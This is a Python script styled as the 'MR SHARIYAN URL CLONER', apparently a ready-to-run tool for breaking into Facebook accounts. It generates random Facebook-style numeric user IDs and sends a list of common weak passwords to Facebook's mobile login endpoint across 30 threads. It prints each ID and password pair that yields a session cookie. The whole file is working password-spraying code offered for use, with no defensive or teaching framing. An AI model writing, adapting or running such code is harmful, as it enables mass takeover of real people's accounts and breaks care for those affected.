import os, sys, time, random, requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# Colors
G = '\033[1;32m' # Green
W = '\033[1;37m' # White
P = '\033[1;35m' # Purple
reset = '\033[0m'

def banner():
    os.system('clear')
    print(f"{P}--- MR SHARIYAN URL CLONER ---{reset}")
    print(f"{W}──────────────────────────────────────────────────")

def start():
    banner()
    print(f"{G}[1] Method: Profile/URL Cloning")
    print(f"{G}[2] Method: Random Number Cloning")
    opt = input(f"\n{W}[+] Select: {reset}")
    
    if opt == '1':
        # Yahan hum profile ID list mangte hain
        print(f"{P}[!] Example Profile ID: 10008472938472")
        tid = input(f"{W}[+] Enter Target ID: {reset}")
        limit = int(input(f"{W}[+] How many ID's to scan?: {reset}"))
        cloning_logic(tid, limit)
    else:
        # Purana random method
        pass

def cloning_logic(tid, limit):
    print(f"{G}[+] Cloning Started... Use Flight Mode if slow{reset}")
    with ThreadPool(max_workers=30) as pool:
        for _ in range(limit):
            # Simulation for URL based targeting
            uid = str(random.randint(10000000000000, 10009999999999))
            # Heavy Password List for better results
            pash = ['786786', 'pakistan', 'khan123', 'khan786', '000786', 'pubg123']
            pool.submit(login, uid, pash)

def login(uid, pash):
    for pas in pash:
        ua = "Mozilla/5.0 (Linux; Android 11; Samsung) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36"
        url = "https://mbasic.facebook.com/login.php"
        data = {"email": uid, "pass": pas, "login": "Log In"}
        try:
            res = requests.post(url, data=data, headers={'User-Agent': ua}, allow_redirects=False)
            if "c_user" in res.cookies.get_dict():
                print(f"{G}[SHARIYAN-OK] {uid} | {pas}{reset}")
                break
        except: pass

if __name__ == "__main__":
    start()
  
